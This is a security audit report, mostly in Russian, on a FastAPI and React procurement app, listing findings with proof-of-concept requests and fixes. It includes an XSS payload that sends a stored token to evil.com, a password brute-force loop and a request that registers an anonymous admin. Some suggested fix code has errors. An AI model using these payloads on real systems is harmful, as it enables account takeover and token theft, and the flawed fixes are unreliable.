# 🔒 Security Audit Report — СнабЛаб v0.2.0

**Дата:** 2026-05-16
**Аудитор:** OWL (Security Auditor)
**Область:** Полный стек — FastAPI backend, React frontend, nginx, Docker, зависимости

---

## Summary

| Severity | Count |
|----------|-------|
| **Critical** | 2 |
| **High** | 4 |
| **Medium** | 5 |
| **Low** | 4 |
| **Info** | 3 |

---

## Findings

---

### [CRITICAL] Несуществующий импорт `require_role` — runtime crash endpoints

- **Location:** `backend/app/api/v1/endpoints/notifications.py:5`
- **Description:** Файл `notifications.py` импортирует `require_role` из `app.core.security`, но эта функция **нигде не определена**. Она определена в `app.core.deps` как класс `RoleChecker`, но экспортируется как экземпляры (`require_admin`, `require_lab_head` и т.д.), а не как фабричная функция `require_role(...)`.
- **Impact:** Все 3 endpoint-а в `notifications.py` (`/test`, `/low-stock-check`, `/expiry-check`) вызывают `ImportError` при первом же запросе. Система мониторинга и уведомлений полностью неработоспособна. Кроме того, любой пользователь может вызвать 500 ошибку, что может быть использовано для DoS.
- **Proof of concept:**
  ```bash
  curl -X POST "http://localhost:8000/api/v1/notifications/test" \
       -H "Authorization: Bearer <valid_token>"
  # → 500 ImportError: cannot import name 'require_role'
  ```
- **Recommendation:** Заменить импорт и использование:
  ```python
  # notifications.py — ИСПРАВИТЬ:
  # БЫЛО:
  from app.core.security import get_current_user, require_role
  # СТАЛО:
  from app.core.deps import get_current_user, require_admin, require_lab_head

  # И заменить require_role("admin") → require_admin
  # И require_role("admin", "lab_head") → require_lab_head
  ```

---

### [CRITICAL] Захардкоженные учётные данные администратора в seed-скрипте

- **Location:** `scripts/seed_reference_data.py:100-106`
- **Description:** Скрипт наполнения БД создаёт пользователя `admin` с паролем `YOUR_ADMIN_PASSWORD`. Этот скрипт может быть случайно запущен в production (через Docker entrypoint, CI/CD или вручную). Пароль `YOUR_ADMIN_PASSWORD` — тривиально подбирается.
- **Impact:** Если скрипт запущен в production, злоумышленник получает полный административный доступ с известными учётными данными. Это прямой вектор компрометации.
- **Proof of concept:**
  ```bash
  # Если seed был запущен в production:
  curl -X POST http://target/api/v1/users/login \
       -H "Content-Type: application/json" \
       -d '{"username":"admin","password":"your_password"}'
  # → 200, access_token для полного доступа
  ```
- **Recommendation:**
  1. Не включать `seed_reference_data.py` в Docker-образ production.
  2. Читать пароль из переменной окружения с значением по умолчанию только для `development`:
     ```python
     import os
     admin_password = os.environ.get("SEED_ADMIN_PASSWORD")
     if not admin_password and settings.app_env == "development":
         admin_password = os.environ.get("SEED_ADMIN_PASSWORD")  # только для dev
     elif not admin_password:
         raise RuntimeError("SEED_ADMIN_PASSWORD must be set in production")
     ```
  3. Добавить проверку: не создавать админа, если он уже существует.

---

### [HIGH] Отсутствует CSP и HSTS security headers

- **Location:** `nginx/nginx.conf:14-17`, `backend/app/main.py`
- **Description:** В nginx настроены `X-Frame-Options`, `X-Content-Type-Options`, `X-XSS-Protection`, `Referrer-Policy`, но **отсутствуют**:
  - `Content-Security-Policy` (CSP) — защита от XSS и injection-атак
  - `Strict-Transport-Security` (HSTS) — принудительный HTTPS
  - `Permissions-Policy` — ограничение браузерных API (камера, микрофон и т.д.)
- **Impact:** Без CSP любой XSS (например, через отображение распарсенных данных КП) позволяет выполнить произвольный JavaScript. Без HSTS возможна атака SSL stripping. Это соответствует OWASP A05:2021 — Security Misconfiguration.
- **Recommendation:** Добавить в nginx.conf:
  ```nginx
  add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self' http://localhost:8000" always;
  add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
  add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;
  ```
  Также добавить `Server: nginx` header suppression:
  ```nginx
  server_tokens off;
  ```

---

### [HIGH] Нет rate limiting на endpoints аутентификации

- **Location:** `backend/app/api/v1/endpoints/users.py:14-40`, `backend/app/main.py:20`
- **Description:** Глобальный rate limiter `slowapi` настроен на `100/minute`, но **endpoints `/register` и `/login` не имеют индивидуальных лимитов**. Лимит 100/мин на IP недостаточен для защиты от brute-force атак на пароли, особенно при использовании прокси (множественные IP → один эндпоинт).
- **Impact:** Злоумышленник может перебирать пароли к существующим аккаунтам (admin, labhead и т.д.) со скоростью ~100 попыток/мин с одного IP. При использовании ротации IP (TOR, прокси) скорость многократно возрастает. Пароль `YOUR_ADMIN_PASSWORD` будет подобран мгновенно.
- **Proof of concept:**
  ```python
  # Brute-force скрипт — ~100 попыток/мин с одного IP
  import requests
  for password in common_passwords:
      r = requests.post("http://target/api/v1/users/login",
          json={"username": "admin", "password": password})
      if r.status_code == 200:
          print(f"CRACKED: {password}")
          break
  ```
- **Recommendation:** Добавить строгие лимиты на auth endpoints:
  ```python
  @router.post("/register", ...)
  @limiter.limit("5/minute")
  async def register_user(request: Request, ...):

  @router.post("/login", ...)
  @limiter.limit("10/minute")
  async def login_user(request: Request, ...):
  ```
  Также рассмотреть блокировку аккаунта после N неудачных попыток.

---

### [HIGH] Отсутствует refresh token и механизм отзыва токенов

- **Location:** `backend/app/core/security.py:27-42`, `backend/app/api/v1/endpoints/users.py:35-40`
- **Description:** Система аутентификации использует только access token (JWT) без refresh token. Токен выдаётся на 24 часа (`timedelta(minutes=60*24)`). Нет механизма отзыва токенов (blacklist, Redis store). Нет endpoint-а `/logout` на бэкенде.
- **Impact:**
  - При компрометации токена злоумышленник имеет доступ на протяжении 24 часов без возможности отзыва.
  - Невозможно деактивировать сессию при увольнении сотрудника или подозрении на компрометацию.
  - Пользователь не может «выйти» из системы — токен валиден до истечения.
- **Recommendation:**
  1. Реализовать refresh token (короткий access token 15-30 мин + refresh token 7 дней).
  2. Хранить revoked tokens в Redis с TTL = оставшееся время жизни токена.
  3. Добавить endpoint `/logout` для добавления токена в blacklist.
  4. Добавить `jti` (JWT ID) claim для уникальной идентификации токенов.

---

### [HIGH] Нет валидации роли пользователя при регистрации

- **Location:** `backend/app/schemas/user.py:10`, `backend/app/api/v1/endpoints/users.py:14-22`
- **Description:** При регистрации пользователь может указать любую роль (`admin`, `lab_head`, `economist`, `lab_tech`) без проверки прав вызывающего. Endpoint `/register` **не требует авторизации** — он полностью публичный.
- **Impact:** Любой анонимный пользователь может зарегистрировать аккаунт с ролью `admin` и получить полный доступ ко всем функциям системы, включая управление пользователями, одобрение закупок и изменение справочников.
- **Proof of concept:**
  ```bash
  curl -X POST http://localhost:8000/api/v1/users/register \
       -H "Content-Type: application/json" \
       -d '{"username":"hacker","password":"password123","role":"admin"}'
  # → 201 Created, полный админ-доступ без аутентификации
  ```
- **Recommendation:**
  1. Защитить `/register` — только админ может создавать пользователей:
     ```python
     @router.post("/register", ...)
     async def register_user(
         request: Request,
         data: UserCreate,
         db: AsyncSession = Depends(get_db),
         current_user: User = Depends(require_admin),  # Только админ
     ):
     ```
  2. Или, если самостоятельная регистрация нужна — жёстко ограничить роль:
     ```python
     class UserCreate(BaseModel):
         role: str = Field(default="lab_tech", pattern="^(lab_tech)$")
     ```

---

### [Medium] Потенциальная инъекция в Content-Disposition header

- **Location:** `backend/app/api/v1/endpoints/offers.py:85`
- **Description:** При скачивании файла КП имя файла извлекается из `item.file_path` (который хранится в БД и формируется из оригинального имени загруженного файла) и подставляется в `Content-Disposition` header без санитизации:
  ```python
  filename = item.file_path.split("/")[-1]
  headers={"Content-Disposition": f"attachment; filename={filename}"}
  ```
  Хотя `file_path` формируется как `{uuid}.{ext}` (что безопасно), если в будущем логика изменится или данные будут импортированы извне — возможна инъекция заголовков.
- **Impact:** Средний — текущая реализация генерирует безопасный путь (UUID), но отсутствие санитизации — потенциальная уязвимость при изменениях кода.
- **Recommendation:** Явно санитизировать имя файла:
  ```python
  import re
  from pathlib import Path

  # Использовать только безопасное имя
  safe_filename = Path(filename).name
  # Удалить потенциально опасные символы
  safe_filename = re.sub(r'[^\w\-.]', '_', safe_filename)
  headers={"Content-Disposition": f'attachment; filename="{safe_filename}"'"}
  ```

---

### [Medium] CORS настроен с `allow_methods=["*"]` и `allow_headers=["*"]`

- **Location:** `backend/app/main.py:57-62`
- **Description:** CORS middleware разрешает все методы и все заголовки:
  ```python
  allow_methods=["*"],
  allow_headers=["*"],
  ```
- **Impact:** Избыпечная конфигурация CORS. Если в будущим будут добавлены чувствительные эндпоинты, текущие настройки позволят cross-origin запросы с любыми методами (DELETE, PUT) и заголовками. В сочетании с `allow_credentials=True` это расширяет поверхность атаки.
- **Recommendation:** Ограничить разрешённые методы и заголовки:
  ```python
  allow_methods=["GET", "POST", "PUT", "PATCH", "DELETE"],
  allow_headers=["Authorization", "Content-Type", "Accept"],
  ```

---

### [Medium] Отсутствует валидация размера загружаемых файлов на уровне приложения

- **Location:** `backend/app/api/v1/endpoints/parser.py:33-55`, `parser.py:62-120`
- **Description:** Валидация расширения файла есть (`.pdf`, `.docx`), но **нет проверки размера файла** на уровне FastAPI. Лимит `client_max_body_size 50M` есть только в nginx. При прямом обращении к бэкенду (без nginx) возможна загрузка файла произвольного размера.
- **Impact:** При прямом доступе к бэкенду (например, из внутренней сети или при обходе nginx) злоумышленник может загрузить файл огромного размера, вызвав DoS через исчерпание памяти/диска. Парсинг большого PDF через `pdftotext` также может вызвать зависание.
- **Recommendation:**
  1. Добавить проверку размера в эндпоинтах:
     ```python
     MAX_FILE_SIZE = 50 * 1024 * 1024  # 50 MB
     content = await file.read()
     if len(content) > MAX_FILE_SIZE:
         raise HTTPException(413, "Файл слишком большой (макс. 50 МБ)")
     ```
  2. Добавить таймаут на `subprocess.run` в `kp_parser.py`:
     ```python
     result = subprocess.run(
         ["pdftotext", "-layout", path, "-"],
         capture_output=True, text=True, timeout=30
     )
     ```

---

### [Medium] Нет аудит-лога действий пользователей

- **Location:** `backend/app/services/*.py` (все сервисы)
- **Description:** В системе отсутствует механизм аудита — логирования кто, когда и какое действие выполнил. Нет записи о создании/изменении/удалении сущностей, входе в систему, скачивании файлов.
- **Impact:** Невозможно расследовать инциденты безопасности, отследить несанкционированные изменения или доказать факт компрометации. Не соответствует требованиям многих стандартов (ГОСТ Р 57580, PCI DSS и т.д.).
- **Recommendation:** Добавить модель `AuditLog` и middleware/декоратор для логирования всех мутирующих операций:
  ```python
  class AuditLog(Base):
      __tablename__ = "audit_logs"
      id: Mapped[int] = mapped_column(primary_key=True)
      user_id: Mapped[int | None]
      action: Mapped[str]  # create, update, delete, login, download
      entity_type: Mapped[str]  # nomenclature, offer, user, etc.
      entity_id: Mapped[int | None]
      details: Mapped[str | None]  # JSON
      ip_address: Mapped[str | None]
      created_at: Mapped[DateTime] = mapped_column(server_default=func.now())
  ```

---

### [Medium] Пароли в логах и debug-режим по умолчанию

- **Location:** `backend/app/core/config.py:13`, `backend/app/main.py:33-42`
- **Description:**
  1. `app_debug: bool = True` — debug-режим включён по умолчанию. В production это может привести к утечке stack traces и внутренней информации.
  2. Middleware `log_requests` логирует все запросы, включая тело запроса (которое может содержать пароли при логине).
- **Impact:** В debug-режиме FastAPI возвращает подробные ошибки с stack traces, путями к файлам и конфигурацией. Логирование тел запросов может записать пароли в plaintext в логи.
- **Recommendation:**
  1. Изменить значение по умолчанию: `app_debug: bool = False`
  2. Добавить глобальный exception handler для маскирования ошибок в production:
     ```python
     @app.exception_handler(Exception)
     async def global_exception_handler(request: Request, exc: Exception):
         logger.error("unhandled_exception", error=str(exc), path=request.url.path)
         return JSONResponse(
             status_code=500,
             content={"detail": "Внутренняя ошибка сервера"},
         )
     ```
  3. Не логировать тело запросов на auth endpoints.

---

### [Low] Токены хранятся в localStorage (уязвимость к XSS)

- **Location:** `frontend/src/api/client.ts:8`, `frontend/src/store/authStore.ts:28-29`
- **Description:** JWT токен и данные пользователя хранятся в `localStorage`:
  ```typescript
  localStorage.setItem('snablab_token', response.access_token)
  localStorage.setItem('snablab_user', JSON.stringify(response.user))
  ```
- **Impact:** `localStorage` доступен из любого JavaScript-контекста страницы. При наличии XSS-уязвимости (например, через отображение неэкранированных данных из парсера КП) злоумышленник может украсть токен:
  ```javascript
  // XSS payload
  fetch('https://evil.com/steal?token=' + localStorage.getItem('snablab_token'))
  ```
- **Recommendation:** Использовать `httpOnly` cookie для хранения токена. Это требует изменений на бэкенде (выдача токена через `Set-Cookie` вместо body) и на фронтенде (чтение из cookie). Как минимум — добавить CSP для снижения риска XSS.

---

### [Low] Отсутствует `server_tokens off` в nginx

- **Location:** `nginx/nginx.conf`
- **Description:** nginx не скрывает версию в заголовке `Server` и в страницах ошибок.
- **Impact:** Злоумышленник может определить версию nginx и искать известные уязвимости для конкретной версии.
- **Recommendation:** Добавить в nginx.conf:
  ```nginx
  server_tokens off;
  ```

---

### [Low] Нет Subresource Integrity (SRI) для внешних ресурсов

- **Location:** `frontend/index.html`
- **Description:** Если фронтенд загружает внешние скрипты или стили (CDN), они не имеют `integrity` атрибутов.
- **Impact:** При компрометации CDN злоумышленник может внедрить вредоносный код. Текущий фронтенд использует локальные бандлы (Vite), так что риск низкий, но важно учесть при добавлении внешних зависимостей.
- **Recommendation:** При подключении CDN-ресурсов всегда добавлять `integrity` и `crossorigin`:
  ```html
  <script src="https://cdn.example.com/lib.js"
          integrity="sha384-..."
          crossorigin="anonymous"></script>
  ```

---

### [Low] Зависимости с потенциальными уязвимостями

- **Location:** `backend/requirements.txt`
- **Description:** Зависимости привязаны к мажорным версиям с wildcard (`==0.115.*`), что не гарантирует отсутствие известных CVE. Конкретные риски:
  - `python-jose[cryptography]==3.3.*` — в прошлом имела CVE-2022-29217 (EC signature verification bypass). Версия 3.3.x содержит исправления, но wildcard может пропустить минорные обновления безопасности.
  - `aiohttp==3.11.*` — имела CVE-2024-23334 (directory traversal через `FileResponse`). Убедиться, что версия ≥ 3.11.13.
  - `fastapi==0.115.*` — зависит от `starlette`, которая имела CVE-2024-47874 (SSRF через `url_path_for`).
- **Impact:** Известные CVE в зависимостях могут быть эксплуатированы для повышения привилегий, DoS или обхода аутентификации.
- **Recommendation:**
  1. Закрепить точные версии в `requirements.txt` (без wildcard).
  2. Запустить `pip audit` или `safety check`:
     ```bash
     pip install pip-audit
     pip audit -r requirements.txt
     ```
  3. Настроить автоматический сканинг в CI/CD (Dependabot, Snyk).

---

### [Info] Отсутствует HTTPS в конфигурации Docker

- **Location:** `docker-compose.yml`, `nginx/nginx.conf`
- **Description:** Docker-compose не настраивает HTTPS/TLS. nginx слушает порт 80 без redirect на 443. В `docker-compose.yml` нет volumes для сертификатов.
- **Impact:** В production все данные (включая токены и пароли) передаются в открытом виде. Это критично для production, но допустимо для разработки.
- **Recommendation:** Для production добавить:
  1. Let's Encrypt сертификаты (certbot) или самоподписанные для внутреннего использования.
  2. Redirect HTTP → HTTPS в nginx.
  3. Добавить `X-Forwarded-Proto` проверку в FastAPI.

---

### [Info] Отсутствует `SECURE` флаг для cookies

- **Location:** `backend/app/api/v1/endpoints/users.py:35-40`
- **Description:** Токен возвращается в теле JSON-ответа и хранится в localStorage на фронтенде. Если в будущем планируется переход на cookie-based auth — необходимо устанавливать флаги `Secure`, `HttpOnly`, `SameSite`.
- **Impact:** Информационный — текущая реализация использует Bearer token в заголовке, а не cookies.
- **Recommendation:** При переходе на cookies:
  ```python
  response.set_cookie(
      key="access_token",
      value=token,
      httponly=True,
      secure=True,
      samesite="strict",
      max_age=3600,
  )
  ```

---

### [Info] Рекомендация: добавить security.txt

- **Description:** Стандарт RFC 9116 — файл `/.well-known/security.txt` с контактной информацией для сообщений об уязвимостях.
- **Recommendation:** Создать файл и разместить за nginx:
  ```
  Contact: mailto:security@shtab-ai.ru
  Expires: 2027-05-16T00:00:00.000Z
  Preferred-Languages: ru, en
  ```

---

## Positive Observations ✅

1. **Пароли хэшируются bcrypt** — используется `passlib[bcrypt]` с автоматической генерацией соли. Это соответствует лучшим практикам (OWASP A07:2021).

2. **JWT с истечением срока** — токены имеют `exp` claim с TTL 24 часа, что ограничивает окно компрометации.

3. **Pydantic валидация входных данных** — все endpoints используют Pydantic schemas с ограничениями (`min_length`, `max_length`, `ge`, `le`, `gt`). Это эффективно предотвращает множество инъекций.

4. **SQLAlchemy ORM** — используется параметризованные запросы через ORM, что исключает классический SQL injection. `ilike` с `%{search}%` также безопасен через SQLAlchemy.

5. **Ролевая модель доступа (RBAC)** — реализована система ролей (`admin`, `lab_head`, `economist`, `lab_tech`) с гранулярной проверкой на уровне endpoints.

6. **Rate limiting** — используется `slowapi` с глобальным лимитом 100/мин, что базово защищает от DoS.

7. **Soft delete** — номенклатура и оборудование удаляются через `is_active = False`, а не физически, что сохраняет целостность данных.

8. **UUID для имён файлов** — загруженные файлы получают имя `{uuid}.{ext}`, что предотвращает path traversal и коллизии имён.

9. **subprocess без shell=True** — вызов `pdftotext` использует список аргументов, а не строку, что исключает command injection.

10. **Базовые security headers в nginx** — `X-Frame-Options`, `X-Content-Type-Options`, `X-XSS-Protection`, `Referrer-Policy` настроены корректно.

---

## Recommendations (приоритет)

### Немедленно (блокирует релиз):
1. Исправить `require_role` импорт в `notifications.py` → **[CRITICAL]**
2. Защитить `/register` от создания админов без авторизации → **[HIGH]**
3. Убрать захардкоженный пароль `YOUR_ADMIN_PASSWORD` из seed-скрипта → **[CRITICAL]**

### Текущий спринт:
4. Добавить rate limiting на `/login` и `/register` → **[HIGH]**
5. Добавить CSP и HSTS headers в nginx → **[HIGH]**
6. Реализовать refresh token + token revocation → **[HIGH]**
7. Добавить проверку размера файлов на уровне приложения → **[Medium]**
8. Добавить глобальный exception handler для production → **[Medium]**

### Следующий спринт:
9. Реализовать аудит-лог действий пользователей → **[Medium]**
10. Перейти на httpOnly cookies для хранения токенов → **[Low]**
11. Закрепить точные версии зависимостей и запустить `pip audit` → **[Low]**
12. Настроить HTTPS для production → **[Info]**

---

*Аудит проведён статическим анализом кода. Рекомендуется дополнительное динамическое тестирование (DAST) перед релизом в production.*
